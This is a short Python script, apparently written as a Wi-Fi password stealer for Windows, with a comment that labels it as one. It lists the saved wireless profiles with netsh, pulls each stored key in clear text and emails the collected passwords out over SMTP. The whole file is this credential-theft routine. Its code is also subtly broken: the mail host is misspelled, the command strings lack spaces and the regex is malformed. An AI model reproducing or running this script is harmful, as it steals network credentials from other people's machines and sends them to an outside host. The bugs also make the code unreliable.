import subprocess, smtplib, re


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gamil.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# Sending email 

# command = "netsh wlan show profile UPC723762 key=clear"
# result = subprocess.check_output(command, shell=True)
# send_email("to@gmail.com", "password", result)


# Getting network connected
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s().*)", networks)
print(network_names_list)

# Stealing wifi password saved on the computer
result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile" + network_name + "key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result
send_email("to@gmail.com", "password", result)